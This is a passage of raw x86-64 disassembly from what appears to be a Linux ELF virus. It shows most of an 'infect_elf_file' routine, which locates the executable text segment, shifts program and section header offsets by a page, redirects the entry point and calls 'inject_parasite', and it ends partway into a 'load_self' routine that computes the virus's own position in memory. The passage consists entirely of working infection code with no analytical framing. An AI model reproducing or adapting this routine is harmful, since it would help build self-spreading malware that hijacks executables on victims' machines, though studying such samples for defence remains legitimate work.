  400927:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  40092e:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  400935:	48 8b 40 60          	mov    rax,QWORD PTR [rax+0x60]
  400939:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  40093d:	48 8b 85 08 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf8]
  400944:	48 8b 40 58          	mov    rax,QWORD PTR [rax+0x58]
  400948:	48 89 45 d8          	mov    QWORD PTR [rbp-0x28],rax
  40094c:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400950:	48 25 00 f0 ff ff    	and    rax,0xfffffffffffff000
  400956:	48 05 00 10 00 00    	add    rax,0x1000
  40095c:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  400960:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  400967:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  40096b:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  40096f:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  400973:	48 83 c0 09          	add    rax,0x9
  400977:	c7 00 25 5d 01 00    	mov    DWORD PTR [rax],0x15d25
  40097d:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  400984:	48 8b 00             	mov    rax,QWORD PTR [rax]
  400987:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
  40098b:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  400992:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  400996:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  40099a:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  4009a1:	48 8b 40 10          	mov    rax,QWORD PTR [rax+0x10]
  4009a5:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  4009a9:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  4009ad:	48 8b 40 18          	mov    rax,QWORD PTR [rax+0x18]
  4009b1:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
  4009b5:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  4009b9:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
  4009bd:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  4009c1:	48 01 c2             	add    rdx,rax
  4009c4:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  4009c8:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  4009cc:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  4009d0:	48 83 c0 38          	add    rax,0x38
  4009d4:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4009d8:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  4009dc:	48 83 c0 38          	add    rax,0x38
  4009e0:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  4009e4:	48 01 ca             	add    rdx,rcx
  4009e7:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  4009eb:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  4009f2:	e9 37 03 00 00       	jmp    400d2e <infect_elf_file+0x420>
  4009f7:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
  4009fb:	74 4b                	je     400a48 <infect_elf_file+0x13a>
  4009fd:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a00:	48 63 d0             	movsxd rdx,eax
  400a03:	48 89 d0             	mov    rax,rdx
  400a06:	48 c1 e0 03          	shl    rax,0x3
  400a0a:	48 29 d0             	sub    rax,rdx
  400a0d:	48 c1 e0 03          	shl    rax,0x3
  400a11:	48 89 c2             	mov    rdx,rax
  400a14:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a18:	48 01 d0             	add    rax,rdx
  400a1b:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  400a1f:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a22:	48 63 d0             	movsxd rdx,eax
  400a25:	48 89 d0             	mov    rax,rdx
  400a28:	48 c1 e0 03          	shl    rax,0x3
  400a2c:	48 29 d0             	sub    rax,rdx
  400a2f:	48 c1 e0 03          	shl    rax,0x3
  400a33:	48 89 c2             	mov    rdx,rax
  400a36:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a3a:	48 01 d0             	add    rax,rdx
  400a3d:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400a41:	48 01 ca             	add    rdx,rcx
  400a44:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  400a48:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a4b:	48 63 d0             	movsxd rdx,eax
  400a4e:	48 89 d0             	mov    rax,rdx
  400a51:	48 c1 e0 03          	shl    rax,0x3
  400a55:	48 29 d0             	sub    rax,rdx
  400a58:	48 c1 e0 03          	shl    rax,0x3
  400a5c:	48 89 c2             	mov    rdx,rax
  400a5f:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a63:	48 01 d0             	add    rax,rdx
  400a66:	8b 00                	mov    eax,DWORD PTR [rax]
  400a68:	83 f8 01             	cmp    eax,0x1
  400a6b:	0f 85 1f 02 00 00    	jne    400c90 <infect_elf_file+0x382>
  400a71:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a74:	48 63 d0             	movsxd rdx,eax
  400a77:	48 89 d0             	mov    rax,rdx
  400a7a:	48 c1 e0 03          	shl    rax,0x3
  400a7e:	48 29 d0             	sub    rax,rdx
  400a81:	48 c1 e0 03          	shl    rax,0x3
  400a85:	48 89 c2             	mov    rdx,rax
  400a88:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a8c:	48 01 d0             	add    rax,rdx
  400a8f:	8b 40 04             	mov    eax,DWORD PTR [rax+0x4]
  400a92:	83 f8 05             	cmp    eax,0x5
  400a95:	0f 85 f5 01 00 00    	jne    400c90 <infect_elf_file+0x382>
  400a9b:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a9e:	48 63 d0             	movsxd rdx,eax
  400aa1:	48 89 d0             	mov    rax,rdx
  400aa4:	48 c1 e0 03          	shl    rax,0x3
  400aa8:	48 29 d0             	sub    rax,rdx
  400aab:	48 c1 e0 03          	shl    rax,0x3
  400aaf:	48 89 c2             	mov    rdx,rax
  400ab2:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400ab6:	48 01 d0             	add    rax,rdx
  400ab9:	48 8b 40 10          	mov    rax,QWORD PTR [rax+0x10]
  400abd:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  400ac1:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400ac4:	48 63 d0             	movsxd rdx,eax
  400ac7:	48 89 d0             	mov    rax,rdx
  400aca:	48 c1 e0 03          	shl    rax,0x3
  400ace:	48 29 d0             	sub    rax,rdx
  400ad1:	48 c1 e0 03          	shl    rax,0x3
  400ad5:	48 89 c2             	mov    rdx,rax
  400ad8:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400adc:	48 01 d0             	add    rax,rdx
  400adf:	48 8b 48 10          	mov    rcx,QWORD PTR [rax+0x10]
  400ae3:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400ae6:	48 63 d0             	movsxd rdx,eax
  400ae9:	48 89 d0             	mov    rax,rdx
  400aec:	48 c1 e0 03          	shl    rax,0x3
  400af0:	48 29 d0             	sub    rax,rdx
  400af3:	48 c1 e0 03          	shl    rax,0x3
  400af7:	48 89 c2             	mov    rdx,rax
  400afa:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400afe:	48 01 c2             	add    rdx,rax
  400b01:	48 89 c8             	mov    rax,rcx
  400b04:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400b08:	48 89 42 10          	mov    QWORD PTR [rdx+0x10],rax
  400b0c:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b0f:	48 63 d0             	movsxd rdx,eax
  400b12:	48 89 d0             	mov    rax,rdx
  400b15:	48 c1 e0 03          	shl    rax,0x3
  400b19:	48 29 d0             	sub    rax,rdx
  400b1c:	48 c1 e0 03          	shl    rax,0x3
  400b20:	48 89 c2             	mov    rdx,rax
  400b23:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b27:	48 01 d0             	add    rax,rdx
  400b2a:	48 8b 48 18          	mov    rcx,QWORD PTR [rax+0x18]
  400b2e:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b31:	48 63 d0             	movsxd rdx,eax
  400b34:	48 89 d0             	mov    rax,rdx
  400b37:	48 c1 e0 03          	shl    rax,0x3
  400b3b:	48 29 d0             	sub    rax,rdx
  400b3e:	48 c1 e0 03          	shl    rax,0x3
  400b42:	48 89 c2             	mov    rdx,rax
  400b45:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b49:	48 01 c2             	add    rdx,rax
  400b4c:	48 89 c8             	mov    rax,rcx
  400b4f:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400b53:	48 89 42 18          	mov    QWORD PTR [rdx+0x18],rax
  400b57:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b5a:	48 63 d0             	movsxd rdx,eax
  400b5d:	48 89 d0             	mov    rax,rdx
  400b60:	48 c1 e0 03          	shl    rax,0x3
  400b64:	48 29 d0             	sub    rax,rdx
  400b67:	48 c1 e0 03          	shl    rax,0x3
  400b6b:	48 89 c2             	mov    rdx,rax
  400b6e:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b72:	48 01 d0             	add    rax,rdx
  400b75:	48 8b 48 20          	mov    rcx,QWORD PTR [rax+0x20]
  400b79:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b7c:	48 63 d0             	movsxd rdx,eax
  400b7f:	48 89 d0             	mov    rax,rdx
  400b82:	48 c1 e0 03          	shl    rax,0x3
  400b86:	48 29 d0             	sub    rax,rdx
  400b89:	48 c1 e0 03          	shl    rax,0x3
  400b8d:	48 89 c2             	mov    rdx,rax
  400b90:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b94:	48 01 d0             	add    rax,rdx
  400b97:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400b9b:	48 01 ca             	add    rdx,rcx
  400b9e:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  400ba2:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400ba5:	48 63 d0             	movsxd rdx,eax
  400ba8:	48 89 d0             	mov    rax,rdx
  400bab:	48 c1 e0 03          	shl    rax,0x3
  400baf:	48 29 d0             	sub    rax,rdx
  400bb2:	48 c1 e0 03          	shl    rax,0x3
  400bb6:	48 89 c2             	mov    rdx,rax
  400bb9:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400bbd:	48 01 d0             	add    rax,rdx
  400bc0:	48 8b 48 28          	mov    rcx,QWORD PTR [rax+0x28]
  400bc4:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400bc7:	48 63 d0             	movsxd rdx,eax
  400bca:	48 89 d0             	mov    rax,rdx
  400bcd:	48 c1 e0 03          	shl    rax,0x3
  400bd1:	48 29 d0             	sub    rax,rdx
  400bd4:	48 c1 e0 03          	shl    rax,0x3
  400bd8:	48 89 c2             	mov    rdx,rax
  400bdb:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400bdf:	48 01 d0             	add    rax,rdx
  400be2:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400be6:	48 01 ca             	add    rdx,rcx
  400be9:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  400bed:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400bf0:	48 63 d0             	movsxd rdx,eax
  400bf3:	48 89 d0             	mov    rax,rdx
  400bf6:	48 c1 e0 03          	shl    rax,0x3
  400bfa:	48 29 d0             	sub    rax,rdx
  400bfd:	48 c1 e0 03          	shl    rax,0x3
  400c01:	48 89 c2             	mov    rdx,rax
  400c04:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400c08:	48 01 d0             	add    rax,rdx
  400c0b:	48 c7 40 30 00 10 00 	mov    QWORD PTR [rax+0x30],0x1000
  400c12:	00 
  400c13:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400c16:	48 63 d0             	movsxd rdx,eax
  400c19:	48 89 d0             	mov    rax,rdx
  400c1c:	48 c1 e0 03          	shl    rax,0x3
  400c20:	48 29 d0             	sub    rax,rdx
  400c23:	48 c1 e0 03          	shl    rax,0x3
  400c27:	48 89 c2             	mov    rdx,rax
  400c2a:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400c2e:	48 01 d0             	add    rax,rdx
  400c31:	48 8b 40 10          	mov    rax,QWORD PTR [rax+0x10]
  400c35:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  400c39:	c7 45 fc 01 00 00 00 	mov    DWORD PTR [rbp-0x4],0x1
  400c40:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400c43:	48 63 d0             	movsxd rdx,eax
  400c46:	48 89 d0             	mov    rax,rdx
  400c49:	48 c1 e0 03          	shl    rax,0x3
  400c4d:	48 29 d0             	sub    rax,rdx
  400c50:	48 c1 e0 03          	shl    rax,0x3
  400c54:	48 89 c2             	mov    rdx,rax
  400c57:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400c5b:	48 01 d0             	add    rax,rdx
  400c5e:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  400c62:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400c65:	48 63 d0             	movsxd rdx,eax
  400c68:	48 89 d0             	mov    rax,rdx
  400c6b:	48 c1 e0 03          	shl    rax,0x3
  400c6f:	48 29 d0             	sub    rax,rdx
  400c72:	48 c1 e0 03          	shl    rax,0x3
  400c76:	48 89 c2             	mov    rdx,rax
  400c79:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400c7d:	48 01 d0             	add    rax,rdx
  400c80:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400c84:	48 01 ca             	add    rdx,rcx
  400c87:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  400c8b:	e9 9a 00 00 00       	jmp    400d2a <infect_elf_file+0x41c>
  400c90:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400c93:	48 63 d0             	movsxd rdx,eax
  400c96:	48 89 d0             	mov    rax,rdx
  400c99:	48 c1 e0 03          	shl    rax,0x3
  400c9d:	48 29 d0             	sub    rax,rdx
  400ca0:	48 c1 e0 03          	shl    rax,0x3
  400ca4:	48 89 c2             	mov    rdx,rax
  400ca7:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400cab:	48 01 d0             	add    rax,rdx
  400cae:	8b 00                	mov    eax,DWORD PTR [rax]
  400cb0:	83 f8 01             	cmp    eax,0x1
  400cb3:	75 75                	jne    400d2a <infect_elf_file+0x41c>
  400cb5:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400cb8:	48 63 d0             	movsxd rdx,eax
  400cbb:	48 89 d0             	mov    rax,rdx
  400cbe:	48 c1 e0 03          	shl    rax,0x3
  400cc2:	48 29 d0             	sub    rax,rdx
  400cc5:	48 c1 e0 03          	shl    rax,0x3
  400cc9:	48 89 c2             	mov    rdx,rax
  400ccc:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400cd0:	48 01 d0             	add    rax,rdx
  400cd3:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  400cd7:	48 85 c0             	test   rax,rax
  400cda:	74 4e                	je     400d2a <infect_elf_file+0x41c>
  400cdc:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400cdf:	48 63 d0             	movsxd rdx,eax
  400ce2:	48 89 d0             	mov    rax,rdx
  400ce5:	48 c1 e0 03          	shl    rax,0x3
  400ce9:	48 29 d0             	sub    rax,rdx
  400cec:	48 c1 e0 03          	shl    rax,0x3
  400cf0:	48 89 c2             	mov    rdx,rax
  400cf3:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400cf7:	48 01 d0             	add    rax,rdx
  400cfa:	8b 40 04             	mov    eax,DWORD PTR [rax+0x4]
  400cfd:	83 e0 02             	and    eax,0x2
  400d00:	85 c0                	test   eax,eax
  400d02:	74 26                	je     400d2a <infect_elf_file+0x41c>
  400d04:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d07:	48 63 d0             	movsxd rdx,eax
  400d0a:	48 89 d0             	mov    rax,rdx
  400d0d:	48 c1 e0 03          	shl    rax,0x3
  400d11:	48 29 d0             	sub    rax,rdx
  400d14:	48 c1 e0 03          	shl    rax,0x3
  400d18:	48 89 c2             	mov    rdx,rax
  400d1b:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400d1f:	48 01 d0             	add    rax,rdx
  400d22:	48 c7 40 30 00 10 00 	mov    QWORD PTR [rax+0x30],0x1000
  400d29:	00 
  400d2a:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  400d2e:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400d32:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  400d36:	0f b7 c0             	movzx  eax,ax
  400d39:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  400d3c:	0f 8c b5 fc ff ff    	jl     4009f7 <infect_elf_file+0xe9>
  400d42:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
  400d46:	75 0c                	jne    400d54 <infect_elf_file+0x446>
  400d48:	48 c7 c0 ff ff ff ff 	mov    rax,0xffffffffffffffff
  400d4f:	e9 e3 01 00 00       	jmp    400f37 <infect_elf_file+0x629>
  400d54:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400d58:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400d5c:	48 8d 50 40          	lea    rdx,[rax+0x40]
  400d60:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400d64:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  400d68:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400d6c:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  400d70:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  400d74:	48 01 d0             	add    rax,rdx
  400d77:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  400d7b:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400d7f:	0f b7 40 3e          	movzx  eax,WORD PTR [rax+0x3e]
  400d83:	0f b7 c0             	movzx  eax,ax
  400d86:	48 c1 e0 06          	shl    rax,0x6
  400d8a:	48 89 c2             	mov    rdx,rax
  400d8d:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d91:	48 01 d0             	add    rax,rdx
  400d94:	48 8b 50 18          	mov    rdx,QWORD PTR [rax+0x18]
  400d98:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  400d9c:	48 01 d0             	add    rax,rdx
  400d9f:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  400da3:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  400daa:	e9 1d 01 00 00       	jmp    400ecc <infect_elf_file+0x5be>
  400daf:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400db2:	48 98                	cdqe   
  400db4:	48 c1 e0 06          	shl    rax,0x6
  400db8:	48 89 c2             	mov    rdx,rax
  400dbb:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400dbf:	48 01 d0             	add    rax,rdx
  400dc2:	8b 00                	mov    eax,DWORD PTR [rax]
  400dc4:	89 c2                	mov    edx,eax
  400dc6:	48 8b 45 a0          	mov    rax,QWORD PTR [rbp-0x60]
  400dca:	48 01 d0             	add    rax,rdx
  400dcd:	ba 05 00 00 00       	mov    edx,0x5
  400dd2:	48 8d 35 69 20 00 00 	lea    rsi,[rip+0x2069]        # 402e42 <display_skeksi+0x9b>
  400dd9:	48 89 c7             	mov    rdi,rax
  400ddc:	e8 72 1e 00 00       	call   402c53 <_strncmp>
  400de1:	85 c0                	test   eax,eax
  400de3:	0f 85 aa 00 00 00    	jne    400e93 <infect_elf_file+0x585>
  400de9:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400dec:	48 98                	cdqe   
  400dee:	48 c1 e0 06          	shl    rax,0x6
  400df2:	48 89 c2             	mov    rdx,rax
  400df5:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400df9:	48 01 d0             	add    rax,rdx
  400dfc:	48 c7 40 18 40 00 00 	mov    QWORD PTR [rax+0x18],0x40
  400e03:	00 
  400e04:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400e07:	48 98                	cdqe   
  400e09:	48 c1 e0 06          	shl    rax,0x6
  400e0d:	48 89 c2             	mov    rdx,rax
  400e10:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400e14:	48 01 c2             	add    rdx,rax
  400e17:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400e1b:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400e1f:	48 89 42 10          	mov    QWORD PTR [rdx+0x10],rax
  400e23:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400e26:	48 98                	cdqe   
  400e28:	48 c1 e0 06          	shl    rax,0x6
  400e2c:	48 89 c2             	mov    rdx,rax
  400e2f:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400e33:	48 01 d0             	add    rax,rdx
  400e36:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  400e3a:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400e3d:	48 98                	cdqe   
  400e3f:	48 c1 e0 06          	shl    rax,0x6
  400e43:	48 89 c1             	mov    rcx,rax
  400e46:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400e4a:	48 01 c8             	add    rax,rcx
  400e4d:	48 83 c2 40          	add    rdx,0x40
  400e51:	48 89 50 10          	mov    QWORD PTR [rax+0x10],rdx
  400e55:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400e58:	48 98                	cdqe   
  400e5a:	48 c1 e0 06          	shl    rax,0x6
  400e5e:	48 89 c2             	mov    rdx,rax
  400e61:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400e65:	48 01 d0             	add    rax,rdx
  400e68:	48 8b 48 20          	mov    rcx,QWORD PTR [rax+0x20]
  400e6c:	48 8b 85 08 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf8]
  400e73:	48 8b 50 58          	mov    rdx,QWORD PTR [rax+0x58]
  400e77:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400e7a:	48 98                	cdqe   
  400e7c:	48 c1 e0 06          	shl    rax,0x6
  400e80:	48 89 c6             	mov    rsi,rax
  400e83:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400e87:	48 01 f0             	add    rax,rsi
  400e8a:	48 01 ca             	add    rdx,rcx
  400e8d:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  400e91:	eb 35                	jmp    400ec8 <infect_elf_file+0x5ba>
  400e93:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400e96:	48 98                	cdqe   
  400e98:	48 c1 e0 06          	shl    rax,0x6
  400e9c:	48 89 c2             	mov    rdx,rax
  400e9f:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400ea3:	48 01 d0             	add    rax,rdx
  400ea6:	48 8b 48 18          	mov    rcx,QWORD PTR [rax+0x18]
  400eaa:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400ead:	48 98                	cdqe   
  400eaf:	48 c1 e0 06          	shl    rax,0x6
  400eb3:	48 89 c2             	mov    rdx,rax
  400eb6:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400eba:	48 01 d0             	add    rax,rdx
  400ebd:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400ec1:	48 01 ca             	add    rdx,rcx
  400ec4:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  400ec8:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  400ecc:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400ed0:	0f b7 40 3c          	movzx  eax,WORD PTR [rax+0x3c]
  400ed4:	0f b7 c0             	movzx  eax,ax
  400ed7:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  400eda:	0f 8c cf fe ff ff    	jl     400daf <infect_elf_file+0x4a1>
  400ee0:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400ee4:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  400ee8:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400eec:	48 01 c2             	add    rdx,rax
  400eef:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400ef3:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  400ef7:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400efb:	48 8b 50 20          	mov    rdx,QWORD PTR [rax+0x20]
  400eff:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400f03:	48 01 c2             	add    rdx,rax
  400f06:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400f0a:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  400f0e:	48 8b 7d a8          	mov    rdi,QWORD PTR [rbp-0x58]
  400f12:	48 8b 8d 08 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xf8]
  400f19:	48 8b 95 00 ff ff ff 	mov    rdx,QWORD PTR [rbp-0x100]
  400f20:	48 8b 75 d0          	mov    rsi,QWORD PTR [rbp-0x30]
  400f24:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f28:	49 89 f8             	mov    r8,rdi
  400f2b:	48 89 c7             	mov    rdi,rax
  400f2e:	e8 24 f7 ff ff       	call   400657 <inject_parasite>
  400f33:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  400f37:	c9                   	leave  
  400f38:	c3                   	ret    

0000000000400f39 <load_self>:
  400f39:	55                   	push   rbp
  400f3a:	48 89 e5             	mov    rbp,rsp
  400f3d:	48 83 ec 30          	sub    rsp,0x30
  400f41:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  400f45:	e8 2d 1e 00 00       	call   402d77 <get_rip>
  400f4a:	48 89 c2             	mov    rdx,rax
  400f4d:	48 8d 05 3a 1e 00 00 	lea    rax,[rip+0x1e3a]        # 402d8e <end_code>
  400f54:	48 01 c2             	add    rdx,rax
  400f57:	48 8d 05 22 1e 00 00 	lea    rax,[rip+0x1e22]        # 402d80 <get_rip_label>
  400f5e:	48 29 c2             	sub    rdx,rax
  400f61:	48 89 d0             	mov    rax,rdx
  400f64:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  400f68:	e8 0a 1e 00 00       	call   402d77 <get_rip>
  400f6d:	48 89 c2             	mov    rdx,rax
  400f70:	48 8d 05 28 1e 00 00 	lea    rax,[rip+0x1e28]        # 402d9f <dummy_marker>
  400f77:	48 01 c2             	add    rdx,rax
  400f7a:	48 8d 05 ff 1d 00 00 	lea    rax,[rip+0x1dff]        # 402d80 <get_rip_label>
  400f81:	48 29 c2             	sub    rdx,rax
  400f84:	48 89 d0             	mov    rax,rdx
  400f87:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  400f8b:	e8 e7 1d 00 00       	call   402d77 <get_rip>
  400f90:	48 89 c2             	mov    rdx,rax
  400f93:	48 8d 05 a7 f2 ff ff 	lea    rax,[rip+0xfffffffffffff2a7]        # 400241 <_start>
  400f9a:	48 01 c2             	add    rdx,rax
  400f9d:	48 8d 05 dc 1d 00 00 	lea    rax,[rip+0x1ddc]        # 402d80 <get_rip_label>
  400fa4:	48 29 c2             	sub    rdx,rax
  400fa7:	48 89 d0             	mov    rax,rdx
  400faa:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  400fae:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  400fb2:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400fb6:	48 89 50 50          	mov    QWORD PTR [rax+0x50],rdx
  400fba:	48 8d 05 cd 1d 00 00 	lea    rax,[rip+0x1dcd]        # 402d8e <end_code>
  400fc1:	48 89 c2             	mov    rdx,rax
  400fc4:	48 8d 05 76 f2 ff ff 	lea    rax,[rip+0xfffffffffffff276]        # 400241 <_start>
  400fcb:	48 29 c2             	sub    rdx,rax
  400fce:	48 89 d0             	mov    rax,rdx
  400fd1:	48 89 c2             	mov    rdx,rax
  400fd4:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
